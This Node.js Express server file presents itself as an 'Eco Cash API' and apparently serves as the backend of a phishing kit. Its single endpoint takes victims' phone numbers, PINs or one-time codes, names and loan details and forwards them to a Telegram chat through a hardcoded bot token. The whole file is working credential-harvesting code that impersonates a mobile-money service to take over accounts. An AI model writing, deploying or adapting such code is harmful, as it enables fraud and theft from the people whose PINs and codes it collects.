const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Root route
app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Eco Cash API is running!' });
});

// Telegram endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        console.log('Received:', { phone, pin, name, type });
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN - Eco Cash 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nName: ${name}\nLoan: $${amount} for ${term} months`;
        } else {
            message = `✅ NEW OTP - Eco Cash ✅\n\nPhone: ${phone}\nOTP: ${pin}\nName: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Sent to Telegram');
            res.json({ success: true });
        } else {
            console.error('Telegram error:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
